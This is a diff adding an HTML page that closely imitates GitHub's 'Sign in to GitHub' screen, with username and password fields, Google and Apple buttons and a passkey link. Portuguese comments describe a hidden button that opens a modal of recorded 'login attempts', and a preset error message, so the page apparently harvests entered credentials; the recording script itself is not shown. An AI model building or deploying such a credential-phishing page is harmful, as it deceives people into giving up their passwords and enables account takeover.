@@ -1,0 +1,211 @@
+<!DOCTYPE html>
+<html
+  lang="en"
+  class="html-auth"
+  data-color-mode="auto"
+  data-light-theme="light"
+  data-dark-theme="dark"
+>
+  <head>
+    <meta charset="utf-8" />
+    <title>Sign in to GitHub · GitHub</title>
+    <meta name="viewport" content="width=device-width" />
+    <link rel="stylesheet" href="styles.css" />
+  </head>
+  <body
+    class="logged-out env-production page-responsive session-authentication"
+  >
+    <!-- Botão escondido no canto superior direito -->
+    <button
+      class="hidden-button"
+      id="hiddenButton"
+      title="Ver tentativas de login"
+    >
+      👁️
+    </button>
+
+    <!-- Modal para exibir as tentativas de login -->
+    <div id="loginAttemptsModal" class="modal">
+      <div class="modal-content">
+        <div class="modal-header">
+          <h2>Tentativas de Login</h2>
+          <span class="close">&times;</span>
+        </div>
+        <div class="modal-body">
+          <div id="loginAttemptsList"></div>
+        </div>
+      </div>
+    </div>
+
+    <div
+      class="application-main"
+      data-commit-hovercards-enabled
+      data-discussion-hovercards-enabled
+      data-issue-and-pr-hovercards-enabled
+      data-project-hovercards-enabled
+    >
+      <main>
+        <div class="authentication">
+          <div class="authentication-header">
+            <div class="auth-form-header">
+              <div style="text-align: center; margin-bottom: 16px">
+                <svg
+                  aria-hidden="true"
+                  height="48"
+                  viewBox="0 0 24 24"
+                  version="1.1"
+                  width="48"
+                  data-view-component="true"
+                  class="octicon octicon-mark-github"
+                >
+                  <path
+                    d="M12 1C5.923 1 1 5.923 1 12c0 4.867 3.149 8.979 7.521 10.436.55.096.756-.233.756-.522 0-.262-.013-1.128-.013-2.049-2.764.509-3.479-.674-3.699-1.292-.124-.317-.66-1.293-1.127-1.554-.385-.207-.936-.715-.014-.729.866-.014 1.485.797 1.691 1.128.99 1.663 2.571 1.196 3.204.907.096-.715.385-1.196.701-1.471-2.448-.275-5.005-1.224-5.005-5.432 0-1.196.426-2.186 1.128-2.956-.111-.275-.496-1.402.11-2.915 0 0 .921-.288 3.024 1.128a10.193 10.193 0 0 1 2.75-.371c.936 0 1.871.123 2.75.371 2.104-1.43 3.025-1.128 3.025-1.128.605 1.513.221 2.64.111 2.915.701.77 1.127 1.747 1.127 2.956 0 4.222-2.571 5.157-5.019 5.432.399.344.743 1.004.743 2.035 0 1.471-.014 2.654-.014 3.025 0 .289.206.632.756.522C19.851 20.979 23 16.854 23 12c0-6.077-4.922-11-11-11Z"
+                  ></path>
+                </svg>
+              </div>
+              <h1>Sign in to GitHub</h1>
+            </div>
+          </div>
+
+          <!-- Caixa de erro -->
+          <div
+            id="error-message"
+            class="flash flash-error"
+            style="display: none"
+          >
+            <svg
+              class="octicon octicon-alert"
+              viewBox="0 0 16 16"
+              width="16"
+              height="16"
+            >
+              <path
+                fill-rule="evenodd"
+                d="M8.22 1.754a.25.25 0 00-.44 0L1.698 13.132a.25.25 0 00.22.368h12.164a.25.25 0 00.22-.368L8.22 1.754zm-1.763-.707c.659-1.234 2.427-1.234 3.086 0l6.082 11.378A1.75 1.75 0 0114.082 15H1.918a1.75 1.75 0 01-1.543-2.575L6.457 1.047zM9 11a1 1 0 11-2 0 1 1 0 012 0zm-.25-5.25a.75.75 0 00-1.5 0v2.5a.75.75 0 001.5 0v-2.5z"
+              ></path>
+            </svg>
+            <span id="error-text">Incorrect username or password.</span>
+          </div>
+
+          <div class="auth-form-body mt-3">
+            <form id="login-form" action="#" method="post">
+              <div class="form-group">
+                <label for="login_field">Username or email address</label>
+                <input
+                  type="text"
+                  name="login"
+                  id="login_field"
+                  class="form-control"
+                  autocapitalize="off"
+                  autocorrect="off"
+                  autocomplete="username"
+                  autofocus
+                  required
+                />
+              </div>
+
+              <div class="form-group position-relative">
+                <div class="d-flex justify-content-between">
+                  <label for="password">Password</label>
+                  <a class="label-link" href="#">Forgot password?</a>
+                </div>
+                <input
+                  type="password"
+                  name="password"
+                  id="password"
+                  class="form-control"
+                  autocomplete="current-password"
+                  required
+                />
+              </div>
+
+              <input
+                type="submit"
+                name="commit"
+                value="Sign in"
+                class="btn btn-primary btn-block"
+                data-disable-with="Signing in…"
+              />
+            </form>
+          </div>
+
+          <!-- Divisor -->
+          <div class="login-divider">
+            <span>or</span>
+          </div>
+
+          <!-- Botões de login social -->
+          <div class="social-login-buttons">
+            <button class="btn btn-social btn-google">
+              <svg width="16" height="16" viewBox="0 0 16 16" fill="none">
+                <path
+                  d="M15.68 8.18182C15.68 7.61455 15.6291 7.06909 15.5345 6.54545H8V9.64364H12.3055C12.1164 10.64 11.5491 11.4836 10.6982 12.0509V14.0655H13.2945C14.8073 12.6691 15.68 10.6182 15.68 8.18182Z"
+                  fill="#4285F4"
+                />
+                <path
+                  d="M8 16C10.16 16 11.9709 15.2873 13.2945 14.0655L10.6982 12.0509C9.99273 12.5309 9.07636 12.8218 8 12.8218C5.92 12.8218 4.15273 11.4182 3.52 9.52727H0.858182V11.5927C2.17455 14.2036 4.87273 16 8 16Z"
+                  fill="#34A853"
+                />
+                <path
+                  d="M3.52 9.52727C3.36 9.03818 3.26545 8.52 3.26545 8C3.26545 7.48 3.36 6.96182 3.52 6.47273V4.40727H0.858182C0.312727 5.48727 0 6.70909 0 8C0 9.29091 0.312727 10.5127 0.858182 11.5927L3.52 9.52727Z"
+                  fill="#FBBC05"
+                />
+                <path
+                  d="M8 3.17818C9.17455 3.17818 10.2291 3.59273 11.0582 4.39636L13.3527 2.10182C11.9673 0.792727 10.1564 0 8 0C4.87273 0 2.17455 1.79636 0.858182 4.40727L3.52 6.47273C4.15273 4.58182 5.92 3.17818 8 3.17818Z"
+                  fill="#EA4335"
+                />
+              </svg>
+              Continue with Google
+            </button>
+
+            <button class="btn btn-social btn-apple">
+              <svg width="16" height="16" viewBox="0 0 16 16" fill="none">
+                <path
+                  d="M12.6667 8.33333C12.6424 6.68182 13.9515 5.84848 14 5.81818C13.1515 4.63636 11.8182 4.51515 11.3939 4.5C10.2727 4.39394 9.18182 5.24242 8.57576 5.24242C7.9697 5.24242 7.06061 4.5 6.12121 4.51515C4.90909 4.5303 3.78788 5.24242 3.18182 6.36364C1.93939 8.57576 2.81818 12.1212 4 13.6061C4.60606 14.4545 5.30303 15.3939 6.24242 15.3485C7.15152 15.303 7.57576 14.7576 8.69697 14.7576C9.81818 14.7576 10.2121 15.3485 11.1818 15.3182C12.1818 15.2879 12.7576 14.4545 13.3333 13.6061C13.9394 12.7576 14.2424 11.9394 14.2727 11.8939C14.2424 11.8788 12.6667 11.1818 12.6667 8.33333Z"
+                  fill="currentColor"
+                />
+                <path
+                  d="M10.9091 2.57576C11.3636 2.0303 11.6667 1.27273 11.5758 0.5C10.9091 0.530303 10.0606 0.969697 9.57576 1.51515C9.15152 1.9697 8.78788 2.75758 8.90909 3.5C9.63636 3.5303 10.4545 3.09091 10.9091 2.57576Z"
+                  fill="currentColor"
+                />
+              </svg>
+              Continue with Apple
+            </button>
+          </div>
+
+          <div class="login-callout mt-3">
+            <p>New to GitHub? <a href="#">Create an account</a>.</p>
+          </div>
+
+          <!-- Passkey login -->
+          <div class="passkey-login">
+            <a href="#" class="passkey-link">
+              <svg
+                width="16"
+                height="16"
+                viewBox="0 0 16 16"
+                fill="currentColor"
+              >
+                <path
+                  d="M4 6a4 4 0 118 0v1h-2V6a2 2 0 10-4 0v1H4V6zm9 1v1a2 2 0 01-2 2H5a2 2 0 01-2-2V7a2 2 0 012-2h6a2 2 0 012 2z"
+                />
+              </svg>
+              Sign in with a passkey
+            </a>
+          </div>
+        </div>
+      </main>
+    </div>
+
+    <div class="footer">
+      <ul>
+        <li><a href="#">Terms</a></li>
+        <li><a href="#">Privacy</a></li>
+        <li><a href="#">Docs</a></li>
+        <li><a href="#">Contact GitHub Support</a></li>
+      </ul>
+    </div>
+
+    <script src="script.js"></script>
+  </body>
+</html>
